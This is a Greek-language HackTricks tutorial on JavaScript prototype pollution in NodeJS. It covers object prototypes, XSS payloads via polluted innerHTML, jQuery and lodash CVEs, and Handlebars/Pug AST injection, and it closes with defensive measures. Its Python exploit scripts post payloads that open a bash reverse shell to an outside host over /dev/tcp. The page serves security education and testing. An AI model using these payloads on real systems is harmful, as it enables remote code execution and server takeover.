# NodeJS - \_\_proto\_\_ & Ρύθμιση Πρωτοτύπου

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Αντικείμενα στην JavaScript <a href="#053a" id="053a"></a>

Τα αντικείμενα στην JavaScript είναι ουσιαστικά συλλογές από ζεύγη κλειδιού-τιμής, γνωστά ως ιδιότητες. Ένα αντικείμενο μπορεί να δημιουργηθεί χρησιμοποιώντας την `Object.create` με το `null` ως όρισμα για να παράγει ένα άδειο αντικείμενο. Αυτή η μέθοδος επιτρέπει τη δημιουργία ενός αντικειμένου χωρίς κληρονομημένες ιδιότητες.
```javascript
// Run this in the developers tools console
console.log(Object.create(null)); // This will output an empty object.
```
Ένα κενό αντικείμενο είναι παρόμοιο με ένα κενό λεξικό, αναπαριστάται ως `{}`.

### Συναρτήσεις και Κλάσεις στην JavaScript

Στην JavaScript, οι κλάσεις και οι συναρτήσεις είναι στενά συνδεδεμένες, με τις συναρτήσεις συχνά να λειτουργούν ως κατασκευαστές για τις κλάσεις. Παρά την έλλειψη φυσικής υποστήριξης κλάσεων στην JavaScript, οι κατασκευαστές μπορούν να προσομοιώσουν τη συμπεριφορά των κλάσεων.
```javascript
// Run this in the developers tools console

function Employee(name, position) {
this.name = name;
this.position = position;
this.introduce = function() {
return "My name is " + this.name + " and I work as a " + this.position + ".";
}
}

Employee.prototype

var employee1 = new Employee("Generic Employee", "Developer");

employee1.__proto__
```
### Πρωτότυπα στην JavaScript

Η JavaScript επιτρέπει την τροποποίηση, προσθήκη ή διαγραφή των χαρακτηριστικών των πρωτοτύπων κατά τη διάρκεια της εκτέλεσης. Αυτή η ευελιξία επιτρέπει τη δυναμική επέκταση των λειτουργιών των κλάσεων.

Συναρτήσεις όπως η `toString` και η `valueOf` μπορούν να τροποποιηθούν για να αλλάξουν τη συμπεριφορά τους, επιδεικνύοντας την προσαρμοστική φύση του πρωτοτύπου της JavaScript.

## Κληρονομικότητα

Στην προγραμματιστική μέθοδο βασισμένη σε πρωτότυπα, τα χαρακτηριστικά/μέθοδοι κληρονομούνται από αντικείμενα από κλάσεις. Αυτές οι κλάσεις δημιουργούνται προσθέτοντας χαρακτηριστικά/μέθοδους είτε σε ένα παράδειγμα μιας άλλης κλάσης είτε σε ένα κενό αντικείμενο.

Να σημειωθεί ότι όταν προστίθεται ένα χαρακτηριστικό σε ένα αντικείμενο που χρησιμεύει ως πρότυπο για άλλα αντικείμενα (όπως το `myPersonObj`), τα αντικείμενα που το κληρονομούν αποκτούν πρόσβαση σε αυτό το νέο χαρακτηριστικό. Ωστόσο, αυτό το χαρακτηριστικό δεν εμφανίζεται αυτόματα εκτός αν κληθεί ρητά.

## Ρύπανση \_\_proto\_\_ <a href="#0d0a" id="0d0a"></a>

## Εξερεύνηση της Ρύπανσης του Πρωτοτύπου στην JavaScript

Τα αντικείμενα της JavaScript καθορίζονται από ζεύγη κλειδιού-τιμής και κληρονομούν από το πρωτότυπο του αντικειμένου της JavaScript. Αυτό σημαίνει ότι η τροποποίηση του πρωτοτύπου του Αντικειμένου μπορεί να επηρεάσει όλα τα αντικείμενα στο περιβάλλον.

Ας χρησιμοποιήσουμε ένα διαφορετικό παράδειγμα για να εξηγήσουμε:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
```
Η πρόσβαση στο πρότυπο του αντικειμένου είναι δυνατή μέσω:
```javascript
car1.__proto__.__proto__;
Vehicle.__proto__.__proto__;
```
Προσθέτοντας ιδιότητες στο πρότυπο του αντικειμένου, κάθε αντικείμενο JavaScript θα κληρονομεί αυτές τις νέες ιδιότητες:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding a method to the Object prototype
car1.__proto__.__proto__.announce = function() { console.log("Beep beep!"); };
car1.announce(); // Outputs "Beep beep!"
// Adding a property to the Object prototype
car1.__proto__.__proto__.isVehicle = true;
console.log(car1.isVehicle); // Outputs true
```
## Ρύπανση πρωτοτύπου

Για ένα σενάριο όπου η χρήση του `__proto__` είναι περιορισμένη, η τροποποίηση του προτύπου μιας συνάρτησης είναι μια εναλλακτική λύση:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding properties to the Vehicle prototype
Vehicle.prototype.beep = function() { console.log("Beep beep!"); };
car1.beep(); // Now works and outputs "Beep beep!"
Vehicle.prototype.hasWheels = true;
console.log(car1.hasWheels); // Outputs true

// Alternate method
car1.constructor.prototype.honk = function() { console.log("Honk!"); };
car1.constructor.prototype.isElectric = true;
```
Αυτό επηρεάζει μόνο αντικείμενα που δημιουργούνται από τον κατασκευαστή `Vehicle`, δίνοντάς τους τις ιδιότητες `beep`, `hasWheels`, `honk` και `isElectric`.

Δύο μέθοδοι για να επηρεάσετε παγκοσμίως αντικείμενα JavaScript μέσω της προτύπου διαρροής περιλαμβάνουν:

1. Διαρροή του `Object.prototype` απευθείας:
```javascript
Object.prototype.goodbye = function() { console.log("Goodbye!"); };
```
2. Ρύπανση του προτύπου ενός κατασκευαστή για μια συχνά χρησιμοποιούμενη δομή:
```javascript
var example = {"key": "value"};
example.constructor.prototype.greet = function() { console.log("Hello!"); };
```
Μετά από αυτές τις λειτουργίες, κάθε αντικείμενο JavaScript μπορεί να εκτελέσει τις μεθόδους `goodbye` και `greet`.

## Ρύπανση άλλων αντικειμένων

### Από μια κλάση στο Object.prototype

Σε ένα σενάριο όπου μπορείτε να **ρυπάνετε ένα συγκεκριμένο αντικείμενο** και χρειάζεστε να **φτάσετε στο `Object.prototype`**, μπορείτε να το αναζητήσετε με κάτι παρόμοιο με τον παρακάτω κώδικα:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### Ρύπανση στοιχείων πίνακα

Σημειώστε ότι καθώς μπορείτε να ρυπάνετε τα χαρακτηριστικά των αντικειμένων στην JS, αν έχετε πρόσβαση να ρυπάνετε έναν πίνακα, μπορείτε επίσης να **ρυπάνετε τιμές του πίνακα** προσβάσιμες **με βάση τους δείκτες** (σημειώστε ότι δεν μπορείτε να αντικαταστήσετε τις τιμές, οπότε πρέπει να ρυπάνετε δείκτες που χρησιμοποιούνται κάπως αλλά δεν εγγράφονται).
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Ρύπανση στοιχείων Html

Όταν δημιουργείτε ένα στοιχείο HTML μέσω JS, είναι δυνατόν να **αντικαταστήσετε** το χαρακτηριστικό **`innerHTML`** για να γράψετε **οποιοδήποτε κώδικα HTML**. [Ιδέα και παράδειγμα από αυτήν την ανάρτηση](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## Παραδείγματα

### Βασικό Παράδειγμα

Η προσβολή της προτύπου προσβολής συμβαίνει λόγω ενός ελαττώματος στην εφαρμογή που επιτρέπει την αντικατάσταση ιδιοτήτων στο `Object.prototype`. Αυτό σημαίνει ότι αφού οι περισσότερα αντικείμενα παίρνουν τις ιδιότητές τους από το `Object.prototype`

Το πιο εύκολο παράδειγμα είναι να προσθέσετε μια τιμή σε μια **απροσδιόριστη ιδιότητα ενός αντικειμένου** που θα ελεγχθεί, όπως:
```javascript
if (user.admin) {
```
Εάν το χαρακτηριστικό **`admin` είναι απροσδιόριστο**, είναι δυνατόν να καταχραστείτε ένα PP και να το ορίσετε σε True με κάτι όπως:
```javascript
Object.prototype.isAdmin = true
let user = {}
user.isAdmin // true
```
Ο μηχανισμός πίσω από αυτό περιλαμβάνει την παραπλάνηση των ιδιοτήτων έτσι ώστε, αν ένας επιτιθέμενος έχει έλεγχο επί ορισμένων εισόδων, μπορεί να τροποποιήσει το πρότυπο όλων των αντικειμένων στην εφαρμογή. Αυτή η παραπλάνηση συνήθως περιλαμβάνει την ρύθμιση της ιδιότητας `__proto__`, η οποία, στην JavaScript, είναι συνώνυμη με την άμεση τροποποίηση του προτύπου ενός αντικειμένου.

Οι προϋποθέσεις υπό τις οποίες μπορεί να εκτελεστεί με επιτυχία αυτή η επίθεση, όπως περιγράφεται σε μια συγκεκριμένη [μελέτη](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf), περιλαμβάνουν:

- Εκτέλεση αναδρομικής συγχώνευσης.
- Ορισμός ιδιοτήτων με βάση ένα μονοπάτι.
- Κλωνοποίηση αντικειμένων.


### Αντικατάσταση συνάρτησης
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Προσβολή του Prototype για RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## Προσβολή του πελάτη μέσω της προσβολής του Prototype για XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019–11358: Επίθεση με προσβολή του Prototype μέσω του jQuery $ .extend

[Για περισσότερες λεπτομέρειες δείτε αυτό το άρθρο](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
Στο jQuery, η συνάρτηση `$ .extend` μπορεί να οδηγήσει σε προσβολή του prototype αν η λειτουργία deep copy χρησιμοποιείται εσφαλμένα. Αυτή η συνάρτηση χρησιμοποιείται συνήθως για την αντιγραφή αντικειμένων ή τη συγχώνευση ιδιοτήτων από ένα προεπιλεγμένο αντικείμενο. Ωστόσο, όταν διαμορφωθεί εσφαλμένα, ιδιότητες που προορίζονται για ένα νέο αντικείμενο μπορούν να ανατεθούν στο prototype αντί αυτού. Για παράδειγμα:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));
console.log({}.devMode); // Outputs: true
```
Αυτή η ευπάθεια, που αναγνωρίζεται ως CVE-2019-11358, επιδεικνύει πώς ένα βαθύ αντίγραφο μπορεί ακούσια να τροποποιήσει το πρότυπο, οδηγώντας σε πιθανούς κινδύνους ασφάλειας, όπως μη εξουσιοδοτημένη πρόσβαση διαχειριστή εάν ιδιότητες όπως `isAdmin` ελέγχονται χωρίς την κατάλληλη επαλήθευση ύπαρξης.

### CVE-2018-3721, CVE-2019-10744: Επίθεση προσβολής προτύπου μέσω του lodash

[Για περισσότερες λεπτομέρειες δείτε αυτό το άρθρο](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

[Το Lodash](https://www.npmjs.com/package/lodash) αντιμετώπισε παρόμοιες ευπάθειες προσβολής προτύπου (CVE-2018-3721, CVE-2019-10744). Αυτά τα θέματα επιλύθηκαν στην έκδοση 4.17.11.

### Ένα άλλο εκπαιδευτικό εγχειρίδιο με CVEs

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### AST Προσβολή προτύπου στο NodeJS

Το NodeJS χρησιμοποιεί εκτεταμένα τα Δέντρα Αφηρημένης Σύνταξης (AST) στην JavaScript για λειτουργίες όπως οι μηχανές προτύπων και ο TypeScript. Αυτή η ενότητα εξετάζει τις ευπάθειες που σχετίζονται με την προσβολή προτύπου στις μηχανές προτύπων, ειδικότερα το Handlebars και το Pug.

#### Ανάλυση ευπάθειας του Handlebars

Η μηχανή προτύπων Handlebars είναι ευάλωτη σε μια επίθεση προσβολής προτύπου. Αυτή η ευπάθεια προκύπτει από συγκεκριμένες λειτουργίες εντός του αρχείου `javascript-compiler.js`. Για παράδειγμα, η λειτουργία `appendContent` συνενώνει το `pendingContent` εάν είναι παρόν, ενώ η λειτουργία `pushSource` επαναφέρει το `pendingContent` σε `undefined` μετά την προσθήκη της πηγής.

##### Διαδικασία εκμετάλλευσης

Η εκμετάλλευση εκμεταλλεύεται το Δέντρο Αφηρημένης Σύνταξης (AST) που παράγεται από το Handlebars, ακολουθώντας αυτά τα βήματα:

1. **Παραπλάνηση του Αναλυτή**: Αρχικά, ο αναλυτής, μέσω του κόμβου `NumberLiteral`, επιβάλλει την αριθμητική φύση των τιμών. Η προσβολή προτύπου μπορεί να παρακάμψει αυτό, επιτρέποντας την εισαγωγή μη αριθμητικών συμβολοσειρών.
2. **Χειρισμός από τον Μεταγλωττιστή**: Ο μεταγλωττιστής μπορεί να επεξεργαστεί ένα αντικείμενο AST ή ένα πρότυπο συμβολοσειράς. Εάν ο τύπος `input` είναι ίσος με `Program`, το εισαγόμενο αντιμετωπίζεται ως προ-αναλυμένο, το οποίο μπορεί να εκμεταλλευτεί.
3. **Εισαγωγή Κώδικα**: Μέσω της παραπλάνησης του `Object.prototype`, μπορεί να εισαχθεί αυθαίρετος κώδικας στη συνάρτηση προτύπου, ο οποίος μπορεί να οδηγήσει σε εκτέλεση απομακρυσμένου κώδικα.

Ένα παράδειγμα που δείχνει την εκμετάλλευση της ευπάθειας του Handlebars:
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
Αυτός ο κώδικας δείχνει πώς ένας επιτιθέμενος μπορεί να εισάγει αυθαίρετο κώδικα σε ένα πρότυπο Handlebars.

**Εξωτερική Αναφορά**: Βρέθηκε ένα πρόβλημα που σχετίζεται με την προσβολή προτύπου στη βιβλιοθήκη 'flat', όπως περιγράφεται εδώ: [Πρόβλημα στο GitHub](https://github.com/hughsk/flat/issues/105).

**Εξωτερική Αναφορά**: [Πρόβλημα που σχετίζεται με την προσβολή προτύπου στη βιβλιοθήκη 'flat'](https://github.com/hughsk/flat/issues/105)

Παράδειγμα εκμετάλλευσης προσβολής προτύπου σε Python:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Ευπάθεια Pug

Το Pug, ένας άλλος μηχανισμός προτύπου, αντιμετωπίζει έναν παρόμοιο κίνδυνο προσβολής του προτύπου. Λεπτομερείς πληροφορίες είναι διαθέσιμες στη συζήτηση για το [AST Injection in Pug](https://blog.p6.is/AST-Injection/#Pug).

Παράδειγμα προσβολής του προτύπου στο Pug:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### Προληπτικά Μέτρα

Για να μειωθεί ο κίνδυνος της προσβολής του πρωτοτύπου, μπορούν να χρησιμοποιηθούν οι παρακάτω στρατηγικές:

1. **Αμετάβλητα Αντικείμενα**: Το `Object.prototype` μπορεί να γίνει αμετάβλητο με τη χρήση της `Object.freeze`.
2. **Επικύρωση Εισόδου**: Τα JSON inputs πρέπει να ελέγχονται αυστηρά σύμφωνα με το σχήμα της εφαρμογής.
3. **Ασφαλείς Συναρτήσεις Συγχώνευσης**: Πρέπει να αποφεύγεται η ανασφαλής χρήση αναδρομικών συναρτήσεων συγχώνευσης.
4. **Αντικείμενα χωρίς Πρωτότυπο**: Μπορούν να δημιουργηθούν αντικείμενα χωρίς ιδιότητες πρωτοτύπου χρησιμοποιώντας το `Object.create(null)`.
5. **Χρήση του Map**: Αντί για το `Object`, πρέπει να χρησιμοποιείται το `Map` για την αποθήκευση ζευγών κλειδιού-τιμής.
6. **Ενημερώσεις Βιβλιοθηκών**: Μπορούν να ενσωματωθούν διορθώσεις ασφαλείας με την τακτική ενημέρωση των βιβλιοθηκών.
7. **Εργαλεία Έλεγχου Κώδικα και Στατικής Ανάλυσης**: Χρησιμοποιήστε εργαλεία όπως το ESLint με κατάλληλα πρόσθετα για την ανίχνευση και πρόληψη ευπάθειας προσβολής του πρωτοτύπου.
8. **Αναθεωρήσεις Κώδικα**: Εφαρμόστε λεπτομερείς αναθεωρήσεις κώδικα για την εντοπισμό και αντιμετώπιση πιθανών κινδύνων που σχετίζονται με την προσβολή του πρωτοτύπου.
9. **Εκπαίδευση Ασφάλειας**: Ενημερώστε τους προγραμματιστές για τους κινδύνους της προσβολής του πρωτοτύπου και τις βέλτιστες πρακτικές για την ασφαλή γραφή κώδικα.
10. **Χρήση Βιβλιοθηκών με Προσοχή**: Να είστε προσεκτικοί κατά τη χρήση βιβλιοθηκών τρίτων. Αξιολογήστε την ασφάλειά τους και εξετάστε τον κώδικά τους, ιδίως αυτόν που αλληλεπιδρά με αντικείμενα.
11. **Προστασία κατά την Εκτέλεση**: Χρησιμοποιήστε μηχανισμούς προστασίας κατά την εκτέλεση, όπως η χρήση πακέτων npm με εστίαση στην ασφάλεια που μπορούν να ανιχνεύσουν και να προλάβουν επιθέσεις προσβολής του πρωτοτύπου.

## Αναφορές

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
* [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετάσχετε** 💬 στην [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs** στα αποθετήρια του [**HackTricks**](https://github.com/carlospolop/hacktricks) και του [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) στο GitHub.

</details>
